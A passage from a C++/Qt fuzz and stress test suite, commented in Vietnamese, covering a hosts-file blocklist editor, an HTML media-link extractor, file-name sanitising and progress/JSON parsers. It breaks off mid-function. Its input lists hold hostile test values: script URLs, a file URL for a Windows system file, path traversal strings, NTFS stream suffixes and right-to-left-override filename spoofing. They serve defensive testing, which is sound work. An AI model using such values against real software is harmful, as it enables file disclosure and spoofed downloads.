        const QString ctx = QString("marker long nhau %1: %2").arg(r).arg(QString(content).replace('\n', "\\n").left(400));
        const QStringList domains = parseManagedDomains(content);
        const QString rebuilt = buildUpdatedHostsContent(content, domains);
        // Mọi dòng ghi chú "# ngoai N" còn đủ, đúng thứ tự; không còn marker thừa; đọc lại ra đúng danh sách.
        QStringList commentsBefore, commentsAfter;
        for (const QString& l : lines) if (l.startsWith("# ngoai")) commentsBefore << l;
        for (const QString& l : rebuilt.split('\n')) if (l.startsWith("# ngoai")) commentsAfter << l;
        CHECK_CTX(commentsBefore == commentsAfter, ctx);
        CHECK_CTX(rebuilt.count(kMarkerStart) == (domains.isEmpty() ? 0 : 1), ctx);
        CHECK_CTX(rebuilt.count(kMarkerEnd) == (domains.isEmpty() ? 0 : 1), ctx);
        CHECK_CTX(parseManagedDomains(rebuilt) == domains, ctx);
        CHECK_CTX(buildUpdatedHostsContent(rebuilt, domains) == rebuilt, ctx);
        // Không tên miền nào tự dưng xuất hiện: mọi tên trong danh sách đều có trong nội dung gốc.
        for (const QString& d : domains)
            CHECK_CTX(content.contains("0.0.0.0 " + d), ctx);
    }

    // Tệp rất lớn: 200 nghìn dòng của người dùng + khối 3000 tên.
    {
        QStringList outside;
        const int outsideCount = scaled(200000);
        for (int i = 0; i < outsideCount; ++i)
            outside << QString("10.%1.%2.%3 may-%4.noi-bo.example").arg(i >> 16 & 255).arg(i >> 8 & 255).arg(i & 255).arg(i);
        QStringList domains;
        const int domainCount = scaled(3000);
        for (int i = 0; i < domainCount; ++i)
            domains << QString("chan-%1.example").arg(i);
        const QString content = expectedHostsContent(outside, domains);
        const QString ctx = QString("%1 dong ngoai + %2 ten (%3 ky tu)").arg(outsideCount).arg(domainCount).arg(content.size());

        QStringList parsed;
        const qint64 tParse = timedMs([&] { parsed = parseManagedDomains(content); });
        QString rebuilt;
        const qint64 tBuild = timedMs([&] { rebuilt = buildUpdatedHostsContent(content, parsed); });
        slowest.note(tParse, "parse: " + ctx);
        slowest.note(tBuild, "build: " + ctx);
        CHECK_CTX(tParse < 3000 && tBuild < 3000, ctx + QString(": parse %1 ms, build %2 ms").arg(tParse).arg(tBuild));
        CHECK(parsed == domains);
        CHECK(rebuilt == content);
    }
    slowest.print("hosts - thuan chuoi");
}

static void stressNormalizeDomain(Rng& rng)
{
    using HostsBlocklist::internal::normalizeDomain;
    const int count = scaled(50000);
    std::printf("-- HostsBlocklist::normalizeDomain: %d chuoi ngau nhien\n", count);
    const QList<QString> pieces = {"http://", "https://", "ftp://", "//", "/", "?", "#", "\\", "@", ":", ":80", ":65535",
                                   ".", "..", "-", "_", "a", "b", "xn--", "localhost", "example", "com", "0", "127", "1",
                                   " ", "\t", "\n", "%20", "[", "]", "::1", "*", "user:pass@", "A", "Z", QString(QChar(0xE9)),
                                   QString(QChar(0x4E2D)), QString(QChar(0x3002)), QString(QChar(0x200B)), QString(QChar(0x202E)),
                                   QString(70, 'x'), QString(QChar(0xFF0E)), QString(QChar(0xDF))};
    int accepted = 0;
    Slowest slowest;
    for (int i = 0; i < count; ++i)
    {
        QString input;
        const int n = rng.range(0, 12);
        for (int k = 0; k < n; ++k)
            input += rng.chance(6) ? randomUnicode(rng, rng.range(1, 3)) : rng.pick(pieces);
        if (rng.chance(1))
            input += QString(rng.range(200, 5000), 'a') + ".com";

        QString error, result;
        slowest.note(timedMs([&] { result = normalizeDomain(input, &error); }), QString("#%1").arg(i));
        const QString ctx = QString("#%1 [%2] -> [%3]").arg(i).arg(input.left(100).toHtmlEscaped(), result.left(100));
        if (result.isEmpty())
        {
            CHECK_CTX(!error.isEmpty(), ctx); // từ chối thì luôn có lý do
            continue;
        }
        ++accepted;
        CHECK_CTX(error.isEmpty(), ctx);
        CHECK_CTX(result.size() <= 253, ctx);
        bool clean = true;
        for (const QChar c : result)
            if (!((c >= 'a' && c <= 'z') || (c >= '0' && c <= '9') || c == '-' || c == '_' || c == '.'))
                clean = false;
        CHECK_CTX(clean, ctx);
        CHECK_CTX(!result.startsWith('.') && !result.endsWith('.') && !result.contains(".."), ctx);
        CHECK_CTX(result != "localhost" && !result.endsWith(".localhost"), ctx);
        CHECK_CTX(normalizeDomain(result) == result, ctx); // lũy đẳng - isOwnFormatLine dựa vào điều này
        // Ghi vào khối rồi đọc lại phải ra đúng nó.
        using namespace HostsBlocklist::internal;
        CHECK_CTX(parseManagedDomains(buildUpdatedHostsContent("127.0.0.1 localhost\n", {result})) == QStringList{result}, ctx);
    }
    slowest.print("normalizeDomain");
    std::printf("  chap nhan %d / %d\n", accepted, count);
    CHECK(accepted > count / 50);
}

/// Thân tệp hosts ngẫu nhiên ở dạng BYTE: kiểu xuống dòng (CRLF/LF/lẫn lộn), có/không BOM, có/không byte
/// không phải UTF-8, có/không dòng trống cuối.
struct HostsFileSample
{
    QByteArray bytes;
    bool pureCrlf{true}; ///< Không có '\n' trần nào
    bool pureLf{true};   ///< Không có "\r\n" nào
};

static HostsFileSample randomHostsFileBytes(Rng& rng)
{
    HostsFileSample s;
    const int style = rng.range(0, 2); // 0 = CRLF, 1 = LF, 2 = lẫn lộn
    if (rng.chance(25))
        s.bytes += QByteArray::fromHex("efbbbf");
    const bool latin1 = rng.chance(25);
    const int lines = rng.range(0, 25);
    for (int i = 0; i < lines; ++i)
    {
        QByteArray line = randomForeignLine(rng).toUtf8();
        if (latin1 && rng.chance(30))
            line += QByteArray("# caf") + char(0xE9) + char(0xA0 + rng.range(0, 30)); // không phải UTF-8 hợp lệ
        if (rng.chance(3))
            line += "a\rb"; // '\r' trần giữa dòng
        const bool last = i == lines - 1;
        if (last && rng.chance(30))
        {
            s.bytes += line; // không có ký tự xuống dòng cuối tệp
            break;
        }
        const bool crlf = style == 0 || (style == 2 && rng.chance(50));
        s.bytes += line + (crlf ? "\r\n" : "\n");
        (crlf ? s.pureLf : s.pureCrlf) = false;
    }
    return s;
}

/// Bỏ BOM + các dòng trắng cuối + đổi mọi kiểu xuống dòng về '\n' - để so "nội dung từng dòng".
static QByteArray canonicalLines(QByteArray bytes)
{
    if (bytes.startsWith(QByteArray::fromHex("efbbbf")))
        bytes.remove(0, 3);
    bytes.replace("\r\n", "\n");
    QList<QByteArray> lines = bytes.split('\n');
    while (!lines.isEmpty() && lines.last().trimmed().isEmpty())
        lines.removeLast();
    return lines.join('\n');
}

static void stressHostsFiles(Rng& rng, const QString& dir)
{
    using namespace HostsBlocklist::internal;
    const int rounds = scaled(250);
    std::printf("-- HostsBlocklist: %d tep hosts TAM ngau nhien (doc/ghi that)\n", rounds);
    for (int r = 0; r < rounds; ++r)
    {
        const QString sub = dir + QString("/hosts-%1").arg(r);
        QDir().mkpath(sub);
        const QString path = sub + "/hosts";
        const HostsFileSample sample = randomHostsFileBytes(rng);
        const bool exists = !rng.chance(5);
        if (exists)
            CHECK(writeFileBytes(path, sample.bytes));
        const QByteArray original = exists ? sample.bytes : QByteArray();
        const QByteArray bom = original.startsWith(QByteArray::fromHex("efbbbf")) ? QByteArray::fromHex("efbbbf") : QByteArray();
        const QString ctx = QString("tep %1 (%2 byte, %3)").arg(r).arg(original.size())
                                .arg(sample.pureCrlf ? "CRLF" : sample.pureLf ? "LF" : "lan lon");

        QStringList model;
        QString err;
        CHECK_CTX(listBlockedDomainsInFile(path, &err).isEmpty() && err.isEmpty(), ctx);

        const int ops = rng.range(1, 12);
        for (int op = 0; op < ops; ++op)
        {
            err.clear();
            if (model.isEmpty() || rng.chance(60))
            {
                const QString d = rng.chance(15) && !model.isEmpty() ? rng.pick(model) : randomValidDomain(rng);
                // Nhập ở dạng "bẩn": URL đầy đủ/chữ hoa - phải chuẩn hóa về đúng tên miền.
                const QString typed = rng.chance(30) ? "HTTPS://" + d.toUpper() + ":443/duong-dan?x=1" : d;
                CHECK_CTX(addDomainToFile(path, typed, &err), ctx + " them " + typed + ": " + err);
                if (!model.contains(d))
                    model << d;
            }
            else
            {
                const QString d = rng.chance(85) ? rng.pick(model) : randomValidDomain(rng);
                CHECK_CTX(removeDomainFromFile(path, d, &err), ctx + " go " + d + ": " + err);
                model.removeAll(d);
            }
            CHECK_CTX(err.isEmpty(), ctx + ": " + err);
            CHECK_CTX(listBlockedDomainsInFile(path) == model, ctx);

            const QByteArray now = readFileBytes(path);
            // BOM giữ nguyên; nội dung TỪNG DÒNG của người dùng còn nguyên, đúng thứ tự, đứng trước khối.
            CHECK_CTX(now.startsWith(bom) && !now.mid(bom.size()).startsWith(QByteArray::fromHex("efbbbf")), ctx);
            const QByteArray canonNow = canonicalLines(now);
            const QByteArray canonOriginal = canonicalLines(original);
            CHECK_CTX(canonNow.startsWith(canonOriginal), ctx);
            // Tệp thuần một kiểu xuống dòng: giữ nguyên TỪNG BYTE phần của người dùng (kể cả kiểu xuống dòng).
            if (sample.pureCrlf || sample.pureLf)
            {
                QByteArray prefix = original;
                while (prefix.endsWith('\n') || prefix.endsWith('\r') || prefix.endsWith(' ') || prefix.endsWith('\t'))
                    prefix.chop(1);
                CHECK_CTX(now.startsWith(prefix), ctx);
            }
            // Phần còn lại sau nội dung của người dùng chỉ gồm đúng khối của công cụ (hoặc không gì cả).
            QByteArray tail = canonNow.mid(canonOriginal.size());
            while (tail.startsWith('\n')) tail.remove(0, 1);
            QByteArray expectedTail;
            if (!model.isEmpty())
            {
                expectedTail = kMarkerStart.toUtf8() + "\n";
                for (const QString& d : model) expectedTail += "0.0.0.0 " + d.toUtf8() + "\n";
                expectedTail += kMarkerEnd.toUtf8();
            }
            CHECK_CTX(tail == expectedTail, ctx);
            CHECK_CTX(!now.contains("\r\r\n") || original.contains("\r\r\n"), ctx);
        }

        // Sao lưu đúng MỘT lần, đúng nguyên bản; không còn tệp tạm nào của QSaveFile sót lại.
        const bool wrote = readFileBytes(path) != original || !exists;
        if (exists && wrote)
            CHECK_CTX(readFileBytes(backupFilePath(path)) == original, ctx);
        const QStringList left = QDir(sub).entryList(QDir::Files | QDir::Hidden | QDir::System);
        for (const QString& name : left)
            CHECK_CTX(name == "hosts" || name == "hosts.oneforall.bak", ctx + " con sot: " + name);
    }

    // Tệp hosts lớn (~6 MB) thêm/gỡ thật.
    {
        QByteArray big;
        const int lines = scaled(150000);
        for (int i = 0; i < lines; ++i)
            big += QByteArray("10.0.0.1 may-") + QByteArray::number(i) + ".noi-bo.example\r\n";
        const QString path = dir + "/hosts-lon";
        CHECK(writeFileBytes(path, big));
        QString err;
        qint64 slowestOp = 0;
        for (int i = 0; i < 5; ++i)
            slowestOp = qMax(slowestOp, timedMs([&] { CHECK(addDomainToFile(path, QString("lon-%1.example").arg(i), &err)); }));
        slowestOp = qMax(slowestOp, timedMs([&] { CHECK(removeDomainFromFile(path, "lon-2.example", &err)); }));
        std::printf("  [hosts - tep %d byte] thao tac cham nhat: %lld ms\n", static_cast<int>(big.size()), static_cast<long long>(slowestOp));
        CHECK_CTX(slowestOp < 3000, QString("%1 ms").arg(slowestOp));
        CHECK(listBlockedDomainsInFile(path) == QStringList({"lon-0.example", "lon-1.example", "lon-3.example", "lon-4.example"}));
        CHECK(readFileBytes(path).startsWith(big));
        CHECK(readFileBytes(backupFilePath(path)) == big);
    }
}

// =====================================================================================================
// 3. PageMediaScanner::extractMediaLinks
// =====================================================================================================

static void stressExtractMediaLinks(Rng& rng)
{
    using PageMediaScannerInternal::extractMediaLinks;
    std::printf("-- extractMediaLinks: HTML lon (nguong 8000 ms moi lan goi)\n");
    constexpr qint64 kLimitMs = 8000; // rộng tay: máy đang bận vẫn qua, còn quay lui bậc hai ở cỡ này là hàng phút
    const int big = scaled(8 * 1000 * 1000);
    auto repeatTo = [](const QString& unit, int chars) { return unit.repeated(qMax(1, chars / static_cast<int>(unit.size()))); };
    const QString base = "http://goc.example/thu-muc/trang.html";
    const QString needleTag = "<img src=\"http://kim.example/kim-trong-day-rom.png\">";
    const QString needleUrl = "http://kim.example/kim-trong-day-rom.png";

    struct Case
    {
        QString label;
        QString html;
    };
    QList<Case> cases;
    cases << Case{"<a lap lai, khong bao gio dong the", repeatTo("<a ", big)};
    cases << Case{"<img src= lap lai, khong dong", repeatTo("<img src=", big)};
    cases << Case{"<img src=\" lap lai (nhay khong dong)", repeatTo("<img src=\"", big)};
    cases << Case{"< x N", QString(big, '<')};
    cases << Case{"> x N", QString(big, '>')};
    cases << Case{"<> lap lai", repeatTo("<<>>", big)};
    cases << Case{"<img + dai chu khong co dau =", "<img " + QString(big, 'a') + ">"};
    cases << Case{"<img + dai chu, khong dong the", "<img " + QString(big, 'a')};
    cases << Case{"<img x x x ... (thuoc tinh khong gia tri)", "<img " + repeatTo("x ", big) + ">"};
    cases << Case{"<img x= lap lai", "<img " + repeatTo("x= ", big) + ">"};
    cases << Case{"<img x=' lap lai", "<img " + repeatTo("x='", big) + ">"};
    cases << Case{"<img a=\"b='c=\" long nhay", "<img " + repeatTo("a=\"b='c=", big) + ">"};
    cases << Case{"<img src=\" + gia tri khong lo, khong dong nhay", "<img src=\"" + QString(big, 'a')};
    cases << Case{"<img src=\" + gia tri khong lo", "<img src=\"/" + QString(big, 'a') + ".png\">"};
    cases << Case{"<img alt + khoang trang khong lo", "<img alt" + QString(big, ' ') + "src=a.png>"};
    cases << Case{"<a href khong nhay khong lo", "<a href=" + QString(big, 'b') + ".pdf>"};
    cases << Case{"srcset khong lo", "<img srcset=\"" + repeatTo("a.jpg 1x, ", big / 4) + "\">"};
    cases << Case{"thuc the &amp; khong lo", "<img src=\"/a.png?" + repeatTo("x=1&amp;", big / 2) + "\">"};
    cases << Case{"dau & khong lo", "<img src=\"/a.png?" + repeatTo("&#x;&#;&a;&", big / 2) + "\">"};
    cases << Case{"the long nhau khong dong", repeatTo("<div><video><source src=a.mp4 ", big)};
    cases << Case{"van ban thuong", repeatTo("Lorem ipsum dolor sit amet, ", big)};
    // Trang thật luôn đi qua QString::fromUtf8() nên không bao giờ chứa nửa cặp thay thế mồ côi - khứ hồi
    // qua UTF-8 để đầu vào ở đây cũng vậy.
    cases << Case{"Unicode ngau nhien", QString::fromUtf8(randomUnicode(rng, big / 4).toUtf8())};
    cases << Case{"<img + dai chu roi moi co thuoc tinh", "<img " + QString(big, 'a') + " src=a.png>"};
    cases << Case{"<img + nhieu tu roi moi co thuoc tinh", "<img " + repeatTo("du-lieu ", big) + "src=a.png>"};
    cases << Case{"<img + dai chu:. roi dau =", "<img " + repeatTo("a:b.c-", big) + "=x>"};
    cases << Case{"<img x  =  (khoang trang quanh dau =)", "<img " + repeatTo("x   =   ", big) + ">"};
    cases << Case{"<img x= + khoang trang khong lo", "<img x=" + QString(big, ' ') + "y src=a.png>"};
    cases << Case{"<a <a ... roi moi dong", repeatTo("<a ", big) + ">"};
    cases << Case{"<img src=x lap lai trong MOT the", "<img " + repeatTo("src=a.png ", big / 8) + ">"};
    cases << Case{"<a href='...' voi nhay don khong lo", "<a href='" + repeatTo("a\"b ", big) + ".pdf'>"};
    {
        QString many;
        const int tags = scaled(60000);
        many.reserve(tags * 40);
        for (int i = 0; i < tags; ++i)
            many += QString("<img src=\"/anh/%1.jpg\"><a href='tai-lieu-%1.pdf'>x</a>\n").arg(i);
        cases << Case{QString("%1 the hop le").arg(tags * 2), many};
    }

    Slowest slowest;
    for (const Case& c : cases)
    {
        const QString ctx = c.label + QString(" (%1 ky tu)").arg(c.html.size());
        QList<MediaLink> links;
        const qint64 t1 = timedMs([&] { links = extractMediaLinks(c.html, base); });
        slowest.note(t1, ctx);
        CHECK_CTX(t1 < kLimitMs, ctx + QString(": %1 ms").arg(t1));

        // Một thẻ hợp lệ đặt SAU phần quái (sau một dấu '>' để chắc chắn nằm ngoài mọi thẻ dở) vẫn phải ra.
        QList<MediaLink> withNeedle;
        const qint64 t2 = timedMs([&] { withNeedle = extractMediaLinks(c.html + ">\n" + needleTag, base); });
        slowest.note(t2, ctx + " + kim o cuoi");
        CHECK_CTX(t2 < kLimitMs, ctx + QString(" + kim: %1 ms").arg(t2));
        bool found = false;
        for (const MediaLink& l : withNeedle)
            found = found || l.url == needleUrl;
        CHECK_CTX(found, ctx + " + kim o cuoi: mat kim");
        QList<MediaLink> needleFirst = extractMediaLinks(needleTag + "\n" + c.html, base);
        CHECK_CTX(!needleFirst.isEmpty() && needleFirst.first().url == needleUrl, ctx + " + kim o dau: mat kim");
    }
    slowest.print("extractMediaLinks - HTML lon");

    // HTML ngẫu nhiên: mọi liên kết trả về phải là http/https tuyệt đối, không trùng nhau.
    const int count = scaled(6000);
    std::printf("-- extractMediaLinks: %d trang HTML ngau nhien\n", count);
    const QList<QString> pieces = {
        "<", ">", "<img", "<IMG", "<video", "<audio", "<source", "<a", "</a>", "<image", "<abbr", " src", " SRC", " href",
        " srcset", " data-src", " poster", " data-srcset", "=", " = ", "\"", "'", " ", "\n", "\t", "/", "a.jpg", "b.PNG",
        "c.mp4", "d.pdf", "e.html", "../", "//cdn.example/x.webp", "http://", "https://", "h.example", "javascript:alert(1)",
        "data:image/png;base64,AAAA", "file:///C:/Windows/win.ini", "ftp://f.example/a.zip", "mailto:a@b.example", "#", "?",
        "&amp;", "&#x26;", "&#38;", "&lt;", "&bogus;", "&", ";", ",", " 1x", " 2x", " 640w", "%5C", "%2F", "..%5C", ":", "@",
        "\\", "<!--", "-->", "<script>", "</script>", "[", "]", "http://[::1]/a.png", "http:///a.png", "HTTP://H.EXAMPLE/A.JPG",
    };
    Slowest slowestRandom;
    qsizetype totalLinks = 0;
    for (int i = 0; i < count; ++i)
    {
        static const QList<QString> tags = {"img", "IMG", "video", "audio", "source", "a", "A", "picture", "image"};
        static const QList<QString> attrs = {"src", "SRC", "href", "srcset", "data-src", "poster", "data-srcset", "alt", "x:y"};
        static const QList<QString> values = {"a.jpg", "/b.PNG", "c.mp4", "../d.pdf", "e.html", "//cdn.example/x.webp?w=1&amp;h=2",
                                              "http://h.example/f.zip", "javascript:alert(1)", "data:image/png;base64,AAAA",
                                              "file:///C:/Windows/win.ini", "a.jpg 1x, b.jpg 2x", "", "g%5Ch.mp3", "#"};
        QString html;
        const int n = rng.range(0, 150);
        for (int k = 0; k < n; ++k)
        {
            if (rng.chance(25))
            {
                // Một thẻ "gần đúng": tên thẻ + vài thuộc tính, dấu nháy kiểu ngẫu nhiên, đôi khi quên đóng.
                html += "<" + rng.pick(tags);
                const int attrCount = rng.range(0, 3);
                for (int a = 0; a < attrCount; ++a)
                {
                    const QString quote = rng.pick(QList<QString>{"\"", "'", ""});
                    html += " " + rng.pick(attrs) + rng.pick(QList<QString>{"=", " = ", "= "}) + quote + rng.pick(values) +
                            (rng.chance(92) ? quote : QString());
                }
                html += rng.chance(90) ? ">" : "";
            }
            else
            {
                html += rng.chance(3) ? randomUnicode(rng, rng.range(1, 5)) : rng.pick(pieces);
            }
        }
        html = QString::fromUtf8(html.toUtf8()); // như trang thật: không có nửa cặp thay thế mồ côi
        const QString pageBase = rng.chance(85) ? base : rng.pick(QList<QString>{"", "khong-phai-url", "file:///C:/a.html", "http://"});
        const QString ctx = QString("trang #%1 goc [%2]: %3").arg(i).arg(pageBase, html.left(160).toHtmlEscaped().replace('\n', "\\n"));

        QList<MediaLink> links;
        slowestRandom.note(timedMs([&] { links = extractMediaLinks(html, pageBase); }), QString("#%1").arg(i));
        totalLinks += links.size();
        QSet<QString> seen;
        for (const MediaLink& l : links)
        {
            const QUrl u(l.url);
            CHECK_CTX(u.isValid() && !u.host().isEmpty(), ctx + " -> " + l.url);
            CHECK_CTX(u.scheme() == "http" || u.scheme() == "https", ctx + " -> " + l.url);
            CHECK_CTX(FileDownloaderInternal::isHttpUrl(l.url), ctx + " -> " + l.url);
            CHECK_CTX(!seen.contains(l.url), ctx + " -> trung " + l.url);
            seen.insert(l.url);
        }
        // Tất định.
        const QList<MediaLink> again = extractMediaLinks(html, pageBase);
        bool same = again.size() == links.size();
        for (int k = 0; same && k < links.size(); ++k)
            same = again[k].url == links[k].url && again[k].type == links[k].type;
        CHECK_CTX(same, ctx);
    }
    slowestRandom.print("extractMediaLinks - ngau nhien");
    std::printf("  tong so lien ket tim duoc: %lld\n", static_cast<long long>(totalLinks));
    CHECK(totalLinks > count / 10);

    // decodeHtmlEntities: đầu vào lớn + ngẫu nhiên - không sinh ký tự NUL/nửa cặp thay thế từ thực thể số.
    {
        const QString huge = repeatTo("&amp;&#x1F600;&#0;&#xD800;&#99999999;&nbsp;&;&#;&#x;", big / 2);
        QString decoded;
        const qint64 ms = timedMs([&] { decoded = PageMediaScannerInternal::decodeHtmlEntities(huge); });
        CHECK_CTX(ms < kLimitMs, QString("decodeHtmlEntities %1 ky tu: %2 ms").arg(huge.size()).arg(ms));
        CHECK(!decoded.contains(QChar(0)));
        CHECK(decoded.size() <= huge.size());
    }
}

// =====================================================================================================
// 4. sanitizeFileName / fileNameFromUrl / uniqueDestPath
// =====================================================================================================

/// Tên có phải tên thiết bị dành riêng của Windows không (xét phần trước dấu chấm ĐẦU TIÊN, bỏ khoảng
/// trắng cuối) - viết ĐỘC LẬP với mã đang kiểm thử. Gồm cả COM¹/COM²/COM³/LPT¹/LPT²/LPT³ (chữ số mũ).
static bool isReservedDeviceName(const QString& name)
{
    QString stem = name.section('.', 0, 0);
    while (!stem.isEmpty() && stem.back().isSpace())
        stem.chop(1);
    stem = stem.toUpper();
    static const QSet<QString> fixed = {"CON", "PRN", "AUX", "NUL", "CONIN$", "CONOUT$"};
    if (fixed.contains(stem))
        return true;
    if (stem.size() == 4 && (stem.startsWith("COM") || stem.startsWith("LPT")))
    {
        const ushort c = stem[3].unicode();
        return (c >= '0' && c <= '9') || c == 0xB9 || c == 0xB2 || c == 0xB3;
    }
    return false;
}

static QString checkSafeFileName(const QString& name, int maxLength = 150)
{
    if (name.isEmpty()) return "rong";
    if (name.size() > maxLength) return "qua dai";
    for (const QChar c : name)
    {
        const ushort u = c.unicode();
        if (u < 0x20 || u == 0x7F) return "ky tu dieu khien";
        if (QStringLiteral("\\/:*?\"<>|").contains(c)) return "ky tu cam";
        if ((u >= 0x202A && u <= 0x202E) || (u >= 0x2066 && u <= 0x2069)) return "ky tu dao chieu chu";
    }
    if (name.back() == '.' || name.back().isSpace()) return "ket thuc bang dau cham/khoang trang";
    if (name.front().isSpace()) return "bat dau bang khoang trang";
    if (name == "." || name == "..") return "la . hoac ..";
    if (isReservedDeviceName(name)) return "ten thiet bi danh rieng";
    return {};
}

static void stressFileNames(Rng& rng)
{
    using namespace FileDownloaderInternal;
    const int count = scaled(60000);
    std::printf("-- sanitizeFileName/fileNameFromUrl/uniqueDestPath: %d ten/URL ngau nhien\n", count);
    const QList<QString> pieces = {
        "a", "b", "tep", "anh", ".txt", ".jpg", ".exe", ".tar.gz", ".", "..", "...", " ", "  ", "\t", "/", "\\", ":", "*", "?",
        "\"", "<", ">", "|", "CON", "con", "PRN", "AUX", "NUL", "nul", "COM1", "COM9", "COM0", "LPT1", "lpt5", "CONIN$",
        "CONOUT$", "COM", "LPT", QString(QChar(0xB9)), QString(QChar(0xB2)), QString(QChar(0xB3)), "::$DATA", ":evil",
        "%5C", "%2F", "%2E%2E", "%00", "%0A", "%3A", "%20", "..%5C..%5C", "../", "..\\", "C:", "C:\\Windows\\", "\\\\may\\chia-se\\",
        QString(QChar(0x202E)), QString(QChar(0x200B)), QString(QChar(0x2066)), QString(QChar(0xFEFF)), QString(QChar(0x00A0)),
        QString(QChar(0x3000)), QString(QChar(0x7F)), QString(QChar(0x01)), QString::fromUtf8("tiếng Việt"), "gpj.exe",
        QString(140, 'x'), QString(151, ' '), QString(60, '.'), "~", "$", "&", "=", "+", "#", "@", "(1)", " (1)",
    };

    QTemporaryDir probeDir; // chỉ để kiểm tra kết quả ghép đường dẫn bằng QDir, không tạo tệp nào
    const QString folder = probeDir.path();
    Slowest slowest;
    int nonEmpty = 0;
    for (int i = 0; i < count; ++i)
    {
        QString raw;
        const int n = rng.range(0, 10);
        for (int k = 0; k < n; ++k)
            raw += rng.chance(6) ? randomUnicode(rng, rng.range(1, 4)) : rng.pick(pieces);
        const QString ctx = QString("#%1 [%2]").arg(i).arg(raw.left(200).toHtmlEscaped());

        QString clean;
        slowest.note(timedMs([&] { clean = sanitizeFileName(raw); }), QString("#%1").arg(i));
        if (!clean.isEmpty())
        {
            ++nonEmpty;
            const QString problem = checkSafeFileName(clean);
            CHECK_CTX(problem.isEmpty(), ctx + " -> [" + clean.left(160) + "]: " + problem);
            CHECK_CTX(sanitizeFileName(clean) == clean, ctx + " -> [" + clean.left(160) + "] khong luy dang");
        }

        // Cùng chuỗi đó nhưng đi qua URL (đường dẫn + query + mảnh) - QUrl giải mã %XX trước khi tới ta.
        const QString url = rng.pick(QList<QString>{"http://h.example/", "https://h.example/thu-muc/", "http://h.example/a/b/../"}) +
                            raw + (rng.chance(20) ? "?x=../../y.exe" : "") + (rng.chance(10) ? "#z/../w" : "");
        const QString fromUrl = fileNameFromUrl(url);
        if (!fromUrl.isEmpty())
        {
            const QString problem = checkSafeFileName(fromUrl);
            CHECK_CTX(problem.isEmpty(), "URL " + ctx + " -> [" + fromUrl.left(160) + "]: " + problem);
        }

        // uniqueDestPath: luôn nằm NGAY trong thư mục lưu, tên hợp lệ, và đúng là đường dẫn chưa bị chiếm.
        const int takenCount = rng.chance(70) ? 0 : rng.range(1, 6);
        int asked = 0;
        QStringList askedPaths;
        const QString dest = uniqueDestPath(folder, rng.chance(50) ? raw : fromUrl, [&](const QString& p) {
            askedPaths << p;
            return asked++ < takenCount;
        });
        const QString uctx = ctx + " -> [" + dest.mid(folder.size()).left(170) + "]";
        CHECK_CTX(dest.startsWith(folder + "/"), uctx);
        const QString leaf = dest.mid(folder.size() + 1);
        const QString leafProblem = checkSafeFileName(leaf, 150 + 12); // + hậu tố " (n)"
        CHECK_CTX(leafProblem.isEmpty(), uctx + ": " + leafProblem);
        CHECK_CTX(QDir::cleanPath(dest) == dest, uctx);
        CHECK_CTX(QFileInfo(dest).absolutePath() == folder, uctx);
        CHECK_CTX(asked == takenCount + 1 && askedPaths.last() == dest, uctx);
        CHECK_CTX(QSet<QString>(askedPaths.begin(), askedPaths.end()).size() == askedPaths.size(), uctx);
        // Tệp tạm đi kèm cũng nằm trong thư mục lưu.
        CHECK_CTX(QFileInfo(dest + kPartSuffix).absolutePath() == folder, uctx);
    }
    slowest.print("sanitizeFileName");
    CHECK(nonEmpty > count / 2);

    // Tên rất dài (1 MB) không được làm chậm.
    {
        const QString huge = QString(scaled(1000 * 1000), 'a') + QString(QChar(0x202E)) + "gpj.exe";
        QString clean;
        const qint64 ms = timedMs([&] { clean = sanitizeFileName(huge); });
        CHECK_CTX(ms < 1000, QString("%1 ms").arg(ms));
        CHECK(checkSafeFileName(clean).isEmpty());
        CHECK(clean.size() <= 150);
    }

    // isHttpUrl: chỉ http/https có tên máy chủ.
    const QList<QString> schemes = {"http://", "https://", "HTTP://", "file:///", "ftp://", "javascript:", "data:", "//", "",
                                    "http:", "http:/", "https:///", " http://", "http://@", "http://:80", "ws://", "blob:http://"};
    for (int i = 0; i < scaled(20000); ++i)
    {
        const QString u = rng.pick(schemes) + (rng.chance(80) ? "h.example" : randomUnicode(rng, rng.range(0, 6))) +
                          (rng.chance(50) ? "/a.bin" : "");
        if (isHttpUrl(u))
        {
            const QUrl parsed(u.trimmed());
            CHECK_CTX(parsed.scheme().toLower() == "http" || parsed.scheme().toLower() == "https", u.toHtmlEscaped());
            CHECK_CTX(!parsed.host().isEmpty(), u.toHtmlEscaped());
        }
    }
}

// =====================================================================================================
// 5. Bộ phân tích dòng tiến độ/JSON
// =====================================================================================================

static QByteArray randomBytes(Rng& rng, int length)
{
    QByteArray out;
    out.resize(length);
    for (int i = 0; i < length; ++i)
        out[i] = static_cast<char>(rng.next() & 0xFF);
    return out;
}

/// Làm hỏng ngẫu nhiên một tài liệu: xóa/chèn/đổi/lặp một đoạn byte.
static QByteArray mutate(Rng& rng, QByteArray doc)
{
    const int edits = rng.range(1, 4);
    for (int e = 0; e < edits && !doc.isEmpty(); ++e)
    {
        const int pos = rng.range(0, static_cast<int>(doc.size()) - 1);
        const int len = rng.range(1, 12);
        switch (rng.range(0, 4))
        {
            case 0: doc.remove(pos, len); break;
            case 1: doc.insert(pos, randomBytes(rng, len)); break;
            case 2: doc[pos] = static_cast<char>(rng.next() & 0xFF); break;
            case 3: doc.insert(pos, doc.mid(pos, len * 4)); break;
            default: doc.insert(pos, rng.pick(QList<QByteArray>{"1e999", "-1e999", "null", "[]", "{}", "\"\"", "9223372036854775808",
                                                                 "-9223372036854775809", "NaN", "Infinity", "\\u0000", "1e308"})); break;
        }
    }
    return doc;
}

static void stressParsers(Rng& rng)
{
    const int count = scaled(60000);
    std::printf("-- parseProgressLine/parseInfoJson/parseThreatsJson/parseComputerStatusJson: %d dau vao moi loai\n", count);

    // ---- parseProgressLine ----
    const QList<QByteArray> fieldValues = {"0", "1", "1048576", "1234567.8", "NA", "None", "", " ", "-1", "-5.5", "1e3", "1e18",
                                           "1e19", "1e308", "1e999", "-1e999", "nan", "NaN", "inf", "-inf", "Infinity", "0x10",
                                           "9223372036854775807", "9223372036854775808", "18446744073709551616", "12abc", "abc",
                                           "1,5", "+7", ".5", "5.", "1 2", "\t3", "4\r"};
    for (int i = 0; i < count; ++i)
    {
        QByteArray line;
        if (rng.chance(80))
        {
            line = rng.chance(92) ? "DLPROG" : rng.pick(QList<QByteArray>{"dlprog", " DLPROG", "DLPROG ", "DLPRO", "[download]"});
            const int fields = rng.chance(85) ? 5 : rng.range(0, 9);
            for (int f = 0; f < fields; ++f)
                line += "|" + rng.pick(fieldValues);
            if (rng.chance(20)) line += rng.pick(QList<QByteArray>{"\r", " ", "\r\n", "|"});
            if (rng.chance(10)) line = mutate(rng, line);
        }
        else
